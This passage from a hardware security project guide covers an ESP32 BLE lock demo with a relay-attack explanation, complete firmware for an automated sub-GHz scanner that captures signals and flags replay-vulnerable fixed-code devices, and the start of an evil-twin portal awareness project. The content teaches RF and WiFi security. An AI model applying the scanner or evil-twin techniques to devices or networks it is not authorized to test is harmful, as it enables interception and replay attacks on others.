        pServer->createService(SERVICE_UUID);

    // Lock State Characteristic (Read + Notify)
    pLockState = pService->createCharacteristic(
        LOCK_STATE_UUID,
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY);
    uint8_t locked = 0x00;
    pLockState->setValue(&locked, 1);

    // Auth Challenge Characteristic (Read)
    pAuthChallenge = pService->createCharacteristic(
        AUTH_CHALLENGE_UUID,
        NIMBLE_PROPERTY::READ);
    pAuthChallenge->setCallbacks(new ChallengeReadCallbacks());
    pAuthChallenge->setValue(currentNonce, 16);

    // Auth Response Characteristic (Write)
    pAuthResponse = pService->createCharacteristic(
        AUTH_RESPONSE_UUID,
        NIMBLE_PROPERTY::WRITE);
    pAuthResponse->setCallbacks(new AuthResponseCallbacks());

    // Event Log Characteristic (Read)
    pEventLogChar = pService->createCharacteristic(
        EVENT_LOG_UUID,
        NIMBLE_PROPERTY::READ);

    // Start service and advertising
    pService->start();
    NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
    pAdv->addServiceUUID(SERVICE_UUID);
    pAdv->setScanResponse(true);
    pAdv->start();

    logEvent("BOOT", "SYSTEM", 0);
    updateDisplay();
    Serial.println("BLE Lock ready. Advertising...");
}

void loop() {
    checkAutoLock();

    // Manual lock toggle via encoder button
    if (digitalRead(ENCODER_BTN) == LOW) {
        delay(200);  // Debounce
        toggleLock();
        logEvent(isLocked ? "LOCK" : "UNLOCK",
                 "BUTTON", 0);
        uint8_t state = isLocked ? 0x00 : 0x01;
        pLockState->setValue(&state, 1);
        if (deviceConnected) pLockState->notify();
        updateDisplay();
    }

    delay(50);
}
```

**Step 8 --- Test with nRF Connect (Phone App)**

1. Upload the sketch to your T-Embed
2. Open the **nRF Connect** app on your phone
3. Scan for BLE devices --- find "BLE-Lock-Demo"
4. Connect to it
5. Explore the GATT services --- you will see the Door Lock Service with its four characteristics
6. Read the Auth Challenge characteristic to get the 16-byte nonce
7. The event log on the T-Embed TFT will show "CONNECT" events

{: .note }
> To perform the full challenge-response from nRF Connect, you would need to compute HMAC-SHA256 externally and write the result to the Auth Response characteristic. For easier testing, you can build a simple ESP32 client sketch (shown below) or add a "demo mode" that accepts any write as valid.

**Step 9 --- Understand BLE Relay Attack Vulnerability**

A relay attack is the most significant real-world threat to BLE proximity locks. Here is how it works conceptually:

```
Normal operation:
┌──────┐  BLE (~2m)  ┌──────┐
│ Phone├─────────────►│ Lock │  ← Phone within range, door opens
└──────┘              └──────┘

Relay attack:
┌──────┐  BLE  ┌─────────┐  Internet  ┌─────────┐  BLE  ┌──────┐
│ Phone├──────►│Attacker ├───────────►│Attacker ├──────►│ Lock │
└──────┘       │ Device 1│            │ Device 2│       └──────┘
  (at home)    └─────────┘            └─────────┘      (at door)
                 (near phone)          (near lock)

The lock thinks the phone is nearby, but it is actually miles away.
The attacker relays BLE packets in real time over the internet.
```

{: .danger }
> Relay attacks are a **real, demonstrated vulnerability** in commercial BLE locks. Researchers have shown that even locks costing hundreds of dollars are vulnerable. Defenses include UWB (Ultra-Wideband) ranging for precise distance measurement, accelerometer-based "intent detection" (detecting that the user is actually walking toward the door), and time-of-flight measurement. RSSI alone is NOT a reliable proximity indicator.

Why RSSI is unreliable for security:

```
RSSI Problems:
1. Environmental variation: Same phone at same distance
   can show -40 dBm one moment and -70 dBm the next
2. Antenna orientation: Rotating the phone 90 degrees
   can change RSSI by 15-20 dBm
3. Body absorption: Phone in pocket vs. hand = 10-15 dBm
4. Multipath: Reflections cause constructive/destructive
   interference, creating unpredictable RSSI patterns
5. Relay attack: Attacker can amplify signal to fake
   close proximity from any distance
```

### Expected Results

- The T-Embed advertises as "BLE-Lock-Demo" and is discoverable by any BLE scanner
- The TFT displays lock state (large LOCKED/UNLOCKED indicator), connection status, and event log
- Connecting with nRF Connect shows the custom GATT service with all four characteristics
- The Auth Challenge characteristic returns a different 16-byte nonce on every read
- Failed authentication attempts are logged with "AUTH_FAIL" in red
- Successful authentication toggles the lock with ascending/descending tones
- Auto-lock engages after 10 seconds of being unlocked
- The encoder button provides manual override (physical key)
- The event log shows a timestamped audit trail of all lock events

### Extensions

- Build a companion ESP32 client sketch that performs the full HMAC-SHA256 challenge-response automatically
- Add RSSI-based proximity detection that only allows authentication when the device is within a configurable distance threshold
- Implement a device whitelist stored in SPIFFS that persists across reboots
- Add a "lockout" mechanism that disables the lock for 60 seconds after 5 failed authentication attempts
- Implement BLE bonding so that only previously paired devices can connect
- Add a real-time RSSI graph on the TFT that updates as a connected device moves closer or farther away

---

## Project 19: Automated RF Vulnerability Scanner
{: .d-inline-block }

Advanced
{: .label .label-red }

### Overview

Professional penetration testers use automated tools to scan networks for vulnerabilities. This project applies the same concept to the RF spectrum: you will build an automated scanner that sweeps across all sub-GHz frequency bands supported by the CC1101, listens for active signals at each frequency, captures them, and automatically classifies whether each signal uses a fixed code (vulnerable to replay) or a rolling code (secure). The result is a comprehensive RF vulnerability report for your environment.

The scanner operates in three phases. First, it performs a broad frequency sweep across the 300--348 MHz, 387--464 MHz, and 779--928 MHz bands, recording RSSI at each step to identify active frequencies. Second, for each frequency where signal activity is detected, it dwells and captures multiple transmissions. Third, it compares the captured transmissions from the same source --- if they are identical, the device uses fixed codes and is vulnerable; if they differ, it uses rolling codes and is secure. Results are color-coded on the TFT display (red for vulnerable, green for secure, yellow for unclassified) and saved to SPIFFS with timestamps for later review.

This is essentially building an automated RF penetration testing tool. Instead of manually checking each device (as in Projects 4 and 8), this scanner does it systematically and reports findings in a structured format. It is a significant step toward the kind of automated security assessment that professionals perform with tools costing thousands of dollars.

{: .danger }
> **This scanner must only be used in environments you own or have explicit written authorization to test.** Automated scanning and signal capture in spaces you do not control may violate federal wiretapping and computer fraud laws. Running this in your own home to assess your own devices is legal and encouraged. Running it in a parking lot to scan strangers' car fobs is a crime.

### What You'll Learn

- Automated frequency sweep techniques across multiple CC1101 bands
- Signal detection using RSSI thresholds and carrier sense
- Multi-capture comparison for fixed-code vs. rolling-code classification
- SPIFFS file system for persistent data storage on ESP32
- Structured report generation on embedded systems
- Professional penetration testing methodology applied to RF
- State machine design for multi-phase scanning workflows
- Color-coded TFT visualization of vulnerability assessment results

### Materials Needed

- T-Embed CC1101 Plus with broadband antenna (or separate antennas for each band)
- USB-C cable for programming
- Arduino IDE or PlatformIO
- (Optional) External battery for portable scanning
- (Optional) Computer for reviewing exported reports
- Several of your own RF devices to scan (garage remotes, doorbells, weather stations, etc.)

### Step-by-Step Instructions

**Step 1 --- Design the Scanner Architecture**

The scanner uses a three-phase state machine:

```
┌─────────────────────────────────────────────────────────┐
│                  Scanner State Machine                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Phase 1: SWEEP                                         │
│  ├── Sweep 300-348 MHz (50 kHz steps)                  │
│  ├── Sweep 387-464 MHz (50 kHz steps)                  │
│  ├── Sweep 779-928 MHz (100 kHz steps)                 │
│  ├── Record RSSI at each step                          │
│  └── Identify frequencies with RSSI > threshold        │
│       │                                                 │
│       ▼                                                 │
│  Phase 2: DWELL & CAPTURE                               │
│  ├── For each active frequency:                        │
│  │   ├── Tune to frequency                             │
│  │   ├── Wait for signal (30s timeout)                 │
│  │   ├── Capture raw OOK/FSK bit stream                │
│  │   ├── Repeat capture 3 times                        │
│  │   └── Store captures in memory                      │
│  │       │                                              │
│  │       ▼                                              │
│  Phase 3: CLASSIFY & REPORT                             │
│  ├── For each captured signal set:                     │
│  │   ├── Compare 3 captures bit-by-bit                 │
│  │   ├── Identical → FIXED CODE (vulnerable)           │
│  │   ├── Different → ROLLING CODE (secure)             │
│  │   └── Partial match → UNKNOWN (needs review)        │
│  ├── Display results on TFT                            │
│  └── Save report to SPIFFS                             │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**Step 2 --- Set Up the Project**

```cpp
// ============================================================
// Automated RF Vulnerability Scanner
// Sweeps sub-GHz bands, captures signals, classifies security
// ============================================================

#include <SPI.h>
#include <TFT_eSPI.h>
#include <SPIFFS.h>
#include <time.h>

// --- Pin Definitions ---
#define CC1101_SCLK    36
#define CC1101_MISO    37
#define CC1101_MOSI    35
#define CC1101_CS      38
#define CC1101_GDO0    39
#define CC1101_GDO2    40
#define ENCODER_A      4
#define ENCODER_B      5
#define ENCODER_BTN    6
#define BUZZER_PIN     46

TFT_eSPI tft = TFT_eSPI();

// --- Band Definitions ---
struct FreqBand {
    uint32_t startHz;
    uint32_t endHz;
    uint32_t stepHz;
    const char* name;
};

const FreqBand bands[] = {
    {300000000, 348000000,  50000, "300-348 MHz"},
    {387000000, 464000000,  50000, "387-464 MHz"},
    {779000000, 928000000, 100000, "779-928 MHz"},
};
const int NUM_BANDS = 3;

// --- Signal Detection ---
#define RSSI_THRESHOLD     -75  // dBm: signals above this are "active"
#define MAX_ACTIVE_FREQS    30  // Max frequencies to analyze
#define CAPTURES_PER_FREQ    3  // Captures per frequency for comparison
#define CAPTURE_SAMPLES    256  // Samples per capture
#define CAPTURE_TIMEOUT_MS 15000 // Wait time for signal at each freq

struct ActiveFrequency {
    uint32_t freqHz;
    int8_t   peakRSSI;
    uint8_t  captures[CAPTURES_PER_FREQ][CAPTURE_SAMPLES];
    int      captureLengths[CAPTURES_PER_FREQ];
    int      capturesCompleted;
    float    similarity;  // 0.0 = all different, 1.0 = all identical
    enum { UNKNOWN, FIXED_CODE, ROLLING_CODE } classification;
};

ActiveFrequency activeFreqs[MAX_ACTIVE_FREQS];
int activeFreqCount = 0;

// --- Scanner State ---
enum ScannerState {
    STATE_IDLE,
    STATE_SWEEP,
    STATE_DWELL,
    STATE_CLASSIFY,
    STATE_REPORT
};
ScannerState scanState = STATE_IDLE;
int currentBand = 0;
int currentActiveIdx = 0;

// --- CC1101 Helpers (reused from previous projects) ---
void cc1101_writeReg(uint8_t addr, uint8_t val) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr);
    SPI.transfer(val);
    digitalWrite(CC1101_CS, HIGH);
}

uint8_t cc1101_readReg(uint8_t addr) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr | 0x80);
    uint8_t v = SPI.transfer(0x00);
    digitalWrite(CC1101_CS, HIGH);
    return v;
}

uint8_t cc1101_readStatus(uint8_t addr) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr | 0xC0);
    uint8_t v = SPI.transfer(0x00);
    digitalWrite(CC1101_CS, HIGH);
    return v;
}

void cc1101_strobe(uint8_t cmd) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(cmd);
    digitalWrite(CC1101_CS, HIGH);
}

void cc1101_setFrequency(uint32_t freqHz) {
    cc1101_strobe(0x36);  // SIDLE
    uint32_t freqWord = (uint32_t)((float)freqHz /
                         26000000.0f * 65536.0f);
    cc1101_writeReg(0x0D, (freqWord >> 16) & 0xFF);
    cc1101_writeReg(0x0E, (freqWord >> 8) & 0xFF);
    cc1101_writeReg(0x0F, freqWord & 0xFF);
}

int8_t cc1101_getRSSI() {
    uint8_t raw = cc1101_readStatus(0x34);
    int16_t rssi;
    if (raw >= 128) rssi = (int16_t)(raw - 256);
    else rssi = raw;
    return (int8_t)(rssi / 2 - 74);
}

void cc1101_initScanner() {
    cc1101_strobe(0x30);  // SRES
    delay(10);
    cc1101_writeReg(0x12, 0x30);  // OOK, no sync
    cc1101_writeReg(0x08, 0x32);  // Async serial
    cc1101_writeReg(0x00, 0x0E);  // GDO2 = carrier sense
    cc1101_writeReg(0x02, 0x0D);  // GDO0 = serial data
    cc1101_writeReg(0x10, 0x86);  // Wide bandwidth
    cc1101_writeReg(0x11, 0x43);
}
```

**Step 3 --- Implement the Frequency Sweep (Phase 1)**

The sweep measures RSSI at each frequency step to build a map of RF activity:

```cpp
void runFrequencySweep() {
    activeFreqCount = 0;

    for (int b = 0; b < NUM_BANDS; b++) {
        const FreqBand* band = &bands[b];
        int totalSteps = (band->endHz - band->startHz) /
                          band->stepHz;

        // Update display: show current band
        tft.fillScreen(TFT_BLACK);
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.setTextSize(2);
        tft.drawString("SWEEPING", 100, 5);
        tft.setTextSize(1);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(band->name, 120, 30);

        // Draw progress bar outline
        tft.drawRect(10, 80, 300, 20, TFT_WHITE);

        for (int step = 0; step < totalSteps; step++) {
            uint32_t freq = band->startHz +
                            (step * band->stepHz);
            cc1101_setFrequency(freq);
            cc1101_strobe(0x34);  // SRX
            delayMicroseconds(800);  // PLL settle

            // Average multiple RSSI readings for accuracy
            int32_t rssiSum = 0;
            for (int r = 0; r < 4; r++) {
                rssiSum += cc1101_getRSSI();
                delayMicroseconds(200);
            }
            int8_t avgRSSI = rssiSum / 4;

            // If signal detected above threshold
            if (avgRSSI > RSSI_THRESHOLD &&
                activeFreqCount < MAX_ACTIVE_FREQS) {
                // Check it is not a duplicate (within 100kHz)
                bool isDuplicate = false;
                for (int i = 0; i < activeFreqCount; i++) {
                    uint32_t diff = abs((int32_t)freq -
                        (int32_t)activeFreqs[i].freqHz);
                    if (diff < 100000) {
                        // Keep the stronger one
                        if (avgRSSI > activeFreqs[i].peakRSSI) {
                            activeFreqs[i].freqHz = freq;
                            activeFreqs[i].peakRSSI = avgRSSI;
                        }
                        isDuplicate = true;
                        break;
                    }
                }

                if (!isDuplicate) {
                    ActiveFrequency* af =
                        &activeFreqs[activeFreqCount];
                    af->freqHz = freq;
                    af->peakRSSI = avgRSSI;
                    af->capturesCompleted = 0;
                    af->similarity = -1;
                    af->classification =
                        ActiveFrequency::UNKNOWN;
                    activeFreqCount++;

                    // Beep on discovery
                    ledcWriteTone(0, 1000);
                    delay(50);
                    ledcWriteTone(0, 0);
                }
            }

            // Update progress bar
            int progress = (step * 300) / totalSteps;
            tft.fillRect(11, 81, progress, 18, TFT_GREEN);

            // Show stats
            tft.fillRect(0, 110, SCREEN_W, 20, TFT_BLACK);
            char buf[60];
            snprintf(buf, sizeof(buf),
                "%.3f MHz  RSSI: %d dBm  Found: %d",
                freq / 1000000.0, avgRSSI, activeFreqCount);
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(buf, 10, 112);
        }
    }

    cc1101_strobe(0x36);  // SIDLE
}
```

**Step 4 --- Implement the Dwell and Capture Phase (Phase 2)**

For each active frequency, the scanner tunes in, waits for signals, and captures multiple transmissions:

```cpp
bool captureAtFrequency(ActiveFrequency* af, int captureIdx) {
    cc1101_setFrequency(af->freqHz);
    cc1101_strobe(0x34);  // SRX
    delay(5);  // Settle

    // Wait for carrier sense
    unsigned long timeout = millis() + CAPTURE_TIMEOUT_MS;
    while (!digitalRead(CC1101_GDO2)) {
        if (millis() > timeout) return false;
    }

    // Capture raw bit stream
    int sampleCount = 0;
    for (int i = 0; i < CAPTURE_SAMPLES; i++) {
        af->captures[captureIdx][i] = digitalRead(CC1101_GDO0);
        delayMicroseconds(100);
        sampleCount++;

        // Stop if carrier drops for >5ms
        if (!digitalRead(CC1101_GDO2)) {
            unsigned long gapStart = micros();
            while (!digitalRead(CC1101_GDO2)) {
                if (micros() - gapStart > 5000) goto done;
                delayMicroseconds(10);
            }
        }
    }

done:
    af->captureLengths[captureIdx] = sampleCount;
    return (sampleCount > 20);
}

void runDwellCapture() {
    for (int i = 0; i < activeFreqCount; i++) {
        ActiveFrequency* af = &activeFreqs[i];

        // Update display
        tft.fillScreen(TFT_BLACK);
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setTextSize(2);
        tft.drawString("CAPTURING", 85, 5);
        tft.setTextSize(1);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);

        char freqStr[30];
        snprintf(freqStr, sizeof(freqStr), "%.3f MHz (%d dBm)",
            af->freqHz / 1000000.0, af->peakRSSI);
        tft.drawString(freqStr, 70, 30);
        tft.drawString("Signal " + String(i+1) + "/" +
            String(activeFreqCount), 100, 45);
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.drawString("Activate your device NOW or wait "
                        "for periodic TX", 5, 70);

        // Capture 3 transmissions
        for (int c = 0; c < CAPTURES_PER_FREQ; c++) {
            tft.fillRect(0, 90, SCREEN_W, 15, TFT_BLACK);
            tft.setTextColor(TFT_CYAN, TFT_BLACK);
            tft.drawString("Waiting for capture " +
                String(c+1) + "/" +
                String(CAPTURES_PER_FREQ) + "...", 60, 92);

            if (captureAtFrequency(af, c)) {
                af->capturesCompleted++;
                tft.fillRect(0, 110, SCREEN_W, 15, TFT_BLACK);
                tft.setTextColor(TFT_GREEN, TFT_BLACK);
                tft.drawString("Captured! " +
                    String(af->captureLengths[c]) +
                    " samples", 80, 112);
                delay(500);
            } else {
                tft.fillRect(0, 110, SCREEN_W, 15, TFT_BLACK);
                tft.setTextColor(TFT_RED, TFT_BLACK);
                tft.drawString("Timeout - no signal", 90, 112);
                delay(300);
            }
        }
    }
}
```

**Step 5 --- Implement the Classification Engine (Phase 3)**

Compare captures from the same frequency to determine fixed vs. rolling codes:

```cpp
void classifyAllSignals() {
    for (int i = 0; i < activeFreqCount; i++) {
        ActiveFrequency* af = &activeFreqs[i];

        if (af->capturesCompleted < 2) {
            af->classification = ActiveFrequency::UNKNOWN;
            af->similarity = -1;
            continue;
        }

        // Compare all capture pairs
        float totalSimilarity = 0;
        int comparisons = 0;

        for (int a = 0; a < af->capturesCompleted - 1; a++) {
            for (int b = a + 1; b < af->capturesCompleted; b++) {
                int minLen = min(af->captureLengths[a],
                                 af->captureLengths[b]);
                if (minLen < 10) continue;

                int matches = 0;
                for (int s = 0; s < minLen; s++) {
                    if (af->captures[a][s] ==
                        af->captures[b][s]) {
                        matches++;
                    }
                }
                totalSimilarity += (float)matches /
                                   (float)minLen;
                comparisons++;
            }
        }

        if (comparisons == 0) {
            af->classification = ActiveFrequency::UNKNOWN;
            af->similarity = -1;
        } else {
            af->similarity = totalSimilarity / comparisons;

            if (af->similarity > 0.90) {
                af->classification =
                    ActiveFrequency::FIXED_CODE;
            } else if (af->similarity < 0.60) {
                af->classification =
                    ActiveFrequency::ROLLING_CODE;
            } else {
                af->classification = ActiveFrequency::UNKNOWN;
            }
        }
    }
}
```

**Step 6 --- Build the Results Display**

```cpp
void drawResultsScreen() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString("SCAN RESULTS", 75, 2);
    tft.setTextSize(1);
    tft.drawFastHLine(0, 20, SCREEN_W, TFT_DARKGREY);

    // Count by classification
    int fixedCount = 0, rollingCount = 0, unknownCount = 0;
    for (int i = 0; i < activeFreqCount; i++) {
        switch (activeFreqs[i].classification) {
            case ActiveFrequency::FIXED_CODE: fixedCount++; break;
            case ActiveFrequency::ROLLING_CODE: rollingCount++; break;
            default: unknownCount++; break;
        }
    }

    // Summary bar
    int summaryY = 24;
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("VULNERABLE: " + String(fixedCount),
                   5, summaryY);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("SECURE: " + String(rollingCount),
                   120, summaryY);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("UNKNOWN: " + String(unknownCount),
                   225, summaryY);

    tft.drawFastHLine(0, summaryY + 12, SCREEN_W, TFT_DARKGREY);

    // Detail list (scrollable via encoder)
    int listY = summaryY + 16;
    for (int i = 0; i < activeFreqCount && listY < 165; i++) {
        ActiveFrequency* af = &activeFreqs[i];
        uint16_t color;
        const char* label;

        switch (af->classification) {
            case ActiveFrequency::FIXED_CODE:
                color = TFT_RED;
                label = "FIXED";
                break;
            case ActiveFrequency::ROLLING_CODE:
                color = TFT_GREEN;
                label = "ROLLING";
                break;
            default:
                color = TFT_YELLOW;
                label = "UNKNOWN";
                break;
        }

        // Color indicator dot
        tft.fillCircle(8, listY + 4, 3, color);

        // Frequency
        char line[60];
        snprintf(line, sizeof(line),
            "%.3f MHz  %ddBm  %.0f%%  %s",
            af->freqHz / 1000000.0,
            af->peakRSSI,
            af->similarity * 100,
            label);
        tft.setTextColor(color, TFT_BLACK);
        tft.drawString(line, 16, listY);
        listY += 11;
    }

    // Footer
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("Press encoder to save report",
                   60, SCREEN_H - 10);
}
```

The results display looks like this:

```
┌──────────────────────────────────────────┐
│          SCAN RESULTS                    │
│──────────────────────────────────────────│
│ VULNERABLE: 3   SECURE: 5   UNKNOWN: 1  │
│──────────────────────────────────────────│
│ ● 315.000 MHz  -42dBm  98%  FIXED       │
│ ● 433.920 MHz  -55dBm  47%  ROLLING     │
│ ● 433.920 MHz  -61dBm  99%  FIXED       │
│ ● 868.350 MHz  -68dBm  51%  ROLLING     │
│ ● 315.025 MHz  -73dBm  95%  FIXED       │
│ ● 433.875 MHz  -59dBm  48%  ROLLING     │
│ ● 433.900 MHz  -66dBm  52%  ROLLING     │
│ ● 868.000 MHz  -70dBm  49%  ROLLING     │
│ ● 315.100 MHz  -74dBm  72%  UNKNOWN     │
│──────────────────────────────────────────│
│        Press encoder to save report      │
└──────────────────────────────────────────┘
```

**Step 7 --- Save the Report to SPIFFS**

```cpp
void saveReport() {
    if (!SPIFFS.begin(true)) {
        Serial.println("SPIFFS mount failed");
        return;
    }

    // Generate filename with timestamp
    char filename[32];
    snprintf(filename, sizeof(filename),
             "/scan_%lu.txt", millis() / 1000);

    File file = SPIFFS.open(filename, FILE_WRITE);
    if (!file) {
        Serial.println("Failed to create report file");
        return;
    }

    file.println("========================================");
    file.println("   RF VULNERABILITY SCAN REPORT");
    file.printf("   Scan ID: %lu\n", millis() / 1000);
    file.println("   Scanner: T-Embed CC1101 Plus");
    file.println("========================================");
    file.println();

    // Summary
    int fixedCount = 0, rollingCount = 0, unknownCount = 0;
    for (int i = 0; i < activeFreqCount; i++) {
        switch (activeFreqs[i].classification) {
            case ActiveFrequency::FIXED_CODE:
                fixedCount++; break;
            case ActiveFrequency::ROLLING_CODE:
                rollingCount++; break;
            default: unknownCount++; break;
        }
    }

    file.println("SUMMARY");
    file.println("-------");
    file.printf("Frequencies scanned: 300-348, 387-464, "
                "779-928 MHz\n");
    file.printf("Active signals found: %d\n", activeFreqCount);
    file.printf("Vulnerable (fixed code): %d\n", fixedCount);
    file.printf("Secure (rolling code): %d\n", rollingCount);
    file.printf("Unclassified: %d\n", unknownCount);
    file.println();

    // Detail for each signal
    file.println("DETAILED FINDINGS");
    file.println("-----------------");
    for (int i = 0; i < activeFreqCount; i++) {
        ActiveFrequency* af = &activeFreqs[i];
        const char* classLabel;
        const char* risk;
        switch (af->classification) {
            case ActiveFrequency::FIXED_CODE:
                classLabel = "FIXED CODE";
                risk = "VULNERABLE - Replay attack possible";
                break;
            case ActiveFrequency::ROLLING_CODE:
                classLabel = "ROLLING CODE";
                risk = "SECURE - Replay attack not feasible";
                break;
            default:
                classLabel = "UNKNOWN";
                risk = "Requires manual analysis";
                break;
        }

        file.printf("\nSignal #%d\n", i + 1);
        file.printf("  Frequency:      %.3f MHz\n",
            af->freqHz / 1000000.0);
        file.printf("  Peak RSSI:      %d dBm\n",
            af->peakRSSI);
        file.printf("  Captures:       %d/%d\n",
            af->capturesCompleted, CAPTURES_PER_FREQ);
        file.printf("  Similarity:     %.1f%%\n",
            af->similarity * 100);
        file.printf("  Classification: %s\n", classLabel);
        file.printf("  Risk:           %s\n", risk);
    }

    file.println();
    file.println("========================================");
    file.println("         END OF REPORT");
    file.println("========================================");
    file.close();

    Serial.printf("Report saved: %s\n", filename);

    // Show confirmation
    tft.fillRect(0, SCREEN_H - 15, SCREEN_W, 15, TFT_BLACK);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Report saved: " + String(filename),
                   50, SCREEN_H - 12);
}
```

**Step 8 --- Wire Up the Main Loop**

```cpp
void setup() {
    Serial.begin(115200);
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    pinMode(CC1101_GDO0, INPUT);
    pinMode(CC1101_GDO2, INPUT);
    pinMode(ENCODER_BTN, INPUT_PULLUP);
    pinMode(ENCODER_A, INPUT_PULLUP);
    pinMode(ENCODER_B, INPUT_PULLUP);

    SPI.begin(CC1101_SCLK, CC1101_MISO, CC1101_MOSI,
              CC1101_CS);

    ledcSetup(0, 1000, 8);
    ledcAttachPin(BUZZER_PIN, 0);

    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);

    cc1101_initScanner();
    SPIFFS.begin(true);

    // Welcome screen
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString("RF VULNERABILITY", 45, 30);
    tft.drawString("SCANNER", 110, 55);
    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Sweeps 300-928 MHz, classifies signals",
                   20, 90);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("YOUR OWN devices and environment ONLY",
                   25, 110);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Press encoder to start scan", 60, 140);

    scanState = STATE_IDLE;
}

void loop() {
    switch (scanState) {
        case STATE_IDLE:
            if (digitalRead(ENCODER_BTN) == LOW) {
                delay(200);
                scanState = STATE_SWEEP;
                activeFreqCount = 0;
                runFrequencySweep();
                if (activeFreqCount > 0) {
                    scanState = STATE_DWELL;
                    runDwellCapture();
                    scanState = STATE_CLASSIFY;
                    classifyAllSignals();
                    scanState = STATE_REPORT;
                    drawResultsScreen();
                } else {
                    tft.fillScreen(TFT_BLACK);
                    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
                    tft.setTextSize(2);
                    tft.drawString("No signals found", 40, 70);
                    tft.setTextSize(1);
                    tft.drawString(
                        "Try activating your devices during sweep",
                        10, 100);
                    scanState = STATE_IDLE;
                }
            }
            break;

        case STATE_REPORT:
            if (digitalRead(ENCODER_BTN) == LOW) {
                delay(200);
                saveReport();
                delay(2000);
                scanState = STATE_IDLE;
            }
            break;

        default:
            break;
    }
}
```

{: .tip }
> For best results, activate your RF devices during the sweep phase. Periodic transmitters like weather stations will be caught automatically, but event-triggered devices (doorbells, remotes) need to be pressed while the scanner is sweeping their frequency range. Have a helper press devices on your behalf during the scan.

### Expected Results

- The sweep phase takes approximately 2--5 minutes to scan all three bands
- A typical home environment will reveal 5--15 active frequencies
- Weather stations (433.92 MHz periodic) will be captured automatically
- Doorbells and remotes (event-triggered) need to be activated during capture
- Fixed-code devices will show 90--100% capture similarity and classify as red "FIXED"
- Rolling-code devices will show 45--55% similarity (near random) and classify as green "ROLLING"
- The saved report provides a structured vulnerability assessment document
- Devices older than 10 years are most likely to be classified as vulnerable

### Extensions

- Add a "continuous monitor" mode that runs the sweep on a loop and alerts when new signals appear
- Implement modulation auto-detection (OOK vs. FSK) by analyzing pulse timing patterns
- Add GPS tagging if a GPS module is connected, to map vulnerable signals to locations
- Build a web-based report viewer that reads SPIFFS files over WiFi and presents an interactive dashboard
- Add signal fingerprinting that identifies specific device types by their transmission characteristics (preamble length, data rate, encoding)
- Implement a scheduled scan mode that runs automatically at configurable intervals and compares results over time to detect new devices

---

## Project 20: Evil Portal Credential Awareness Trainer
{: .d-inline-block }

Advanced
{: .label .label-red }

### Overview

Evil twin attacks are one of the most dangerous WiFi threats in the real world. An attacker creates a fake access point with the same name as a legitimate network, and when unsuspecting users connect, they are presented with a convincing login page that captures their credentials. Coffee shops, hotels, airports, and conference centers are prime targets. The attack is devastatingly effective because most people have been trained to enter credentials into captive portals without questioning them --- every hotel WiFi does it, every airline lounge does it, so why would this one be any different?

This project builds a security awareness training tool that safely demonstrates how evil twin attacks work. The T-Embed creates a WiFi access point with a configurable SSID (such as "Free_WiFi" or a clone of your own network name). When someone connects, a DNS captive portal redirects all web traffic to a login page hosted on the T-Embed. Here is the critical difference from an actual attack: **instead of stealing credentials, the portal immediately displays a security awareness message** explaining that the user just entered information into an untrusted network, along with practical advice on how to protect themselves. No actual credentials are stored, captured, or logged --- only connection metadata (MAC address, timestamp) is recorded to measure engagement.

The TFT display shows real-time statistics: total connections, unique devices, how many users saw the awareness message, and a timeline of activity. This is a legitimate training tool used by corporate security teams, IT departments, and security awareness programs worldwide. It transforms a dangerous attack technique into a powerful educational experience.

{: .danger }
> **THIS TOOL MUST ONLY BE USED WITH EXPLICIT CONSENT.** Before running this on any network, you must have written authorization from the network owner AND inform all potential users that a security awareness exercise is taking place. Running this without consent is illegal and unethical --- it constitutes unauthorized interception of network traffic. Use it at home with your family's knowledge, or in a corporate setting with management approval and employee notification. See [Chapter 13 --- Legal Reference](13-legal-reference/) for full legal guidance.

{: .warning }
> This project deliberately does NOT capture, store, or log any credentials entered by users. The form submission handler discards all input immediately and shows only the awareness message. If you modify this code to actually capture credentials, you are building a weapon, not a training tool, and you accept full legal liability.

### What You'll Learn

- ESP32 WiFi access point (SoftAP) configuration
- DNS server implementation for captive portal redirection
- HTTP web server on ESP32 with custom HTML/CSS/JavaScript
- Captive portal detection behavior across iOS, Android, Windows, and macOS
- SPIFFS-based web content storage and serving
- Real-time statistics tracking and TFT visualization
- Network security awareness training methodology
- The anatomy of real evil twin attacks and how to defend against them

### Materials Needed

- T-Embed CC1101 Plus (uses the ESP32-S3 WiFi radio, not the CC1101)
- USB-C cable for programming and initial setup
- Arduino IDE or PlatformIO
- A smartphone or laptop to test the portal (your own device)
- (Optional) External battery for portable operation during training sessions
- (Optional) SD card module for storing custom portal HTML templates

{: .note }
> The CC1101 sub-GHz radio is not used in this project. This project uses the ESP32-S3's built-in 2.4 GHz WiFi radio for access point and web server functionality.

### Step-by-Step Instructions

**Step 1 --- Understand How Captive Portals Work**

